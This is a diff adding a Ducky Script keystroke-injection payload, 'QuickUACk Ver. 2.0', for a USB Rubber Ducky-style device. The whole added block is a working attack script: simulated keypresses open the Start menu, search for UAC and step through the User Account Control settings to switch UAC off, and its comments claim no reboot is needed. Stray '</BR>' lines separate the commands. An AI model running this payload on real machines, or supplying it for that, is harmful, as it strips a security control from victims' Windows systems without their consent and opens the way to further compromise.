@@ -80,3 +80,55 @@ ENTER
 
 
 QuickUACk Ver. 2.0
+
+DELAY 2000
+</BR>
+CTRL ESC
+</BR>
+DELAY 200
+</BR>
+REM opens directly the User Account Control Panel 
+</BR>
+REM work on all windows version 32 and 64 bit with uac (Vista or Earlier)
+</BR>
+REM no reboot is required for disabling
+</BR>
+STRING UAC
+</BR>
+DELAY 200
+</BR>
+ENTER
+</BR>
+DELAY 200
+</BR>
+LEFTARROW
+</BR>
+DELAY 200
+</BR>
+ENTER
+</BR>
+DELAY 200
+</BR>
+DOWNARROW
+</BR>
+DOWNARROW
+</BR>
+DOWNARROW
+</BR>
+DOWNARROW
+</BR>
+DELAY 200
+</BR>
+TAB
+</BR>
+DELAY 200
+</BR>
+ENTER
+</BR>
+DELAY 200
+</BR>
+LEFTARROW
+</BR>
+DELAY 200
+</BR>
+ENTER
